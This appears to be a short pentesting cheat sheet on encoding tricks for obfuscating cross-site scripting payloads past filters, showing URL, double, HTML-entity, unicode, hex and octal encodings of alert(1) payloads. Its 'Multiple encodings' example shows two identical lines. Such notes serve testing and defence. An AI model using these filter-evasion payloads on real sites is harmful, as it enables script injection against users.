### Encode as URL

```http2
/?search=Fish & Chips
```


```http2
/?search=Fish+%26+Chips
```

### Double encoding as URL

| Character | Percent encoded | Double encoded  |
| --------- |:---------------:| ---------------:|
|     <     |       %3C       |      %253C      |
|     >     |       %3E       |      %253E      |
|     /     |       %2F       |      %252F      |

### HTML encoding

```html
<img src=x onerror="alert(1)">
```

```html
<img src=x onerror="&#x61;lert(1)">
```

### Leading zeros

```html
<a href="javascript:alert(1)">Click me</a>
```

```html
<a href="javascript&#058;alert(1)">Click me</a>
```

```html
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

### Unicode escaping

```js
eval("alert(1)")
```

```js
eval("\u0061lert(1)")
```

https://dencode.com/string/unicode-escape

### ASCII Hex encoding

```js
eval("alert")
```

```js
eval("\x61lert")
```

Prefixed with \x

### ASCII Octal encoding

```js
eval("alert")
```

```js
eval("\141lert")
```

Prefixed with \

### Multiple encodings

```html
<a href="javascript:alert(1)">Click me</a>
```

```html
<a href="javascript:alert(1)">Click me</a>
```

https://onlinestringtools.com/convert-string-to-octal

#### References:

https://portswigger.net/web-security/reference/obfuscating-attacks-using-encodings

https://subscription.packtpub.com/book/networking-and-servers/9781785284588/1/ch01lvl1sec11/double-encoding
